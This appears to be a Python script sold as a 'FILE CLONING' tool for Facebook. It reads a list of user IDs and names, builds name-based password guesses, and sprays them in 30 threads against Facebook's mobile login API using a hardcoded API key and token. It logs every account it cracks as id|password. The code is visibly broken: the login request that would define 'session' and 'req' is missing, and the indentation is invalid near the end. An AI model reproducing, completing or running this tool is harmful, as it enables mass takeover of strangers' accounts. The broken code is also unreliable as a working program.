#WRITTEN BY MR.DIPTO
#FOLLOW MY GITHUB : https://github.com/MR-DIPTO-404
#----------import----------#
import os
from time import sleep as slp
from concurrent.futures import ThreadPoolExecutor as ted
import uuid
import random 
import httpx
import json
import sys
#----------logo----------#
logo=('''                       
___       ___          ________      _    ____     ______     
`MMb     dMM'          `MMMMMMMb.   dM.   `MM'     `M`MM'     
 MMM.   ,PMM            MM    `Mb  ,MMb    MM       M MM      
 M`Mb   d'MM ___  __    MM     MM  d'YM.   MM       M MM      
 M YM. ,P MM `MM 6MM    MM     MM ,P `Mb   MM       M MM      
 M `Mb d' MM  MM69 "    MM    .M9 d'  YM.  MM       M MM      
 M  YM.P  MM  MM'       MMMMMMM9',P   `Mb  MM       M MM      
 M  `Mb'  MM  MM        MM       d'    YM. MM       M MM      
 M   YP   MM  MM        MM      ,MMMMMMMMb YM       M MM      
 M   `'   MM  MM   68b  MM      d'      YM. 8b     d8 MM    / 
_M_      _MM__MM_  Y89 _MM_   _dM_     _dMM_ YMMMMM9 _MMMMMMM ''')
#----------clear----------#
def clear():
    os.system('clear')
    print(logo)
    print(42*'-')
    print(' FB PAGE : SHVNI ZUCCHINI ')
    print(' GITHUB  : MR-SHVNI-404')
    print(42*'-')
#----------line----------#
def line():
    print(42*'-')
#----------menu----------#
def main():
    clear()
    print(' [A] FILE CLONING ')
    print(' [E] EXIT ')
    line()
    option=input(' [??] CHOICE MENU : ')
    if option in ['a','A']:
        __file__()
    else:
        exit(' THANKS FOR USING ')
#----------file----------#
def __file__():
    clear()
    filex=input(' [??] ENTER FILE PATH : ')
    try:
        fo=open(filex,'r').read().splitlines()
    except FileNotFoundError:
        print(' File not found !!');slp(2)
        __file__()
    clear()
    try:
        pas_limit=int(input(' [??] ENTER PASSWORD LIMIT (1-20) : '))
    except:
        pas_limit=1
    line()
    pas_list=[]
    for i in range(pas_limit):
        pasx=input(f' [??] ENTER PASSWORD {i+1} : ')
        pas_list.append(pasx)
    with ted(max_workers=30) as Dipto:
        tl=str(len(fo))
        clear()
        print(' TOTAL ACCOUNT : '+tl)
        print(' USE AIRPLANE MODE FOR SPEED UP')
        line()
        for user in fo:
            ids,names=user.split('|')
            passlist=pas_list
            Dipto.submit(m1,ids,names,passlist)
    line()
    print(' THE PROCESS HAS BEEN COMPLETE')
    input(' PRESS ENTER TO BACK : ')
    main()
loop=0
oks=[]
cps=[]
#----------method------------#
def m1(ids,names,passlist):
    global oks,loop
    try:
        fn=names.split(' ')[0]
        try:
            ln=names.split(' ')[1]
        except:
            ln=fn
        for pw in passlist:
            sys.stdout.write('\r\r [RUNNING] %s|ALIVE:%s '%(loop,len(oks)));sys.stdout.flush()
            pas=pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
            data={'adid': str(uuid.uuid4()), 'format': 'json', 'device_id': str(uuid.uuid4()), 'email': ids, 'password': pas, 'generate_analytics_claims': '1', 'community_id': '', 'cpl': 'true', 'try_num': '1', 'family_device_id': str(uuid.uuid4()), 'credentials_type': 'password', 'source': 'login', 'error_detail_type': 'button_with_disabled', 'enroll_misauth': 'false', 'generate_session_cookies': '1', 'generate_machine_id': '1', 'currently_logged_in_userid': '0', 'locale': 'en_US', 'client_country_code': 'US', 'fb_api_req_friendly_name': 'authenticate', 'api_key': '882a8490361da98702bf97a021ddc14d', 'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32'}
            header_freefb = {'authority' : 'p.facebook.com ',
            'method' : 'GET',
            'scheme' : 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'dpr': '2',
            'referer': 'https://ph.search.yahoo.com/',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"vivo Y83"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"8.1.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'cross-site',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'viewport-width': '980',}
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                print('\r\r [ALIVE] '+ids+'|'+pas)
                oks.append(ids)
                break
            elif 'www.facebook.com' in req['error']['message']:
                print('\r\r [CHECKPOINT] '+ids+'|'+pas)
                cps.append(ids)
                break
            else:
                continue
        loop+=1
    except:
        pass
#----------end----------#
main()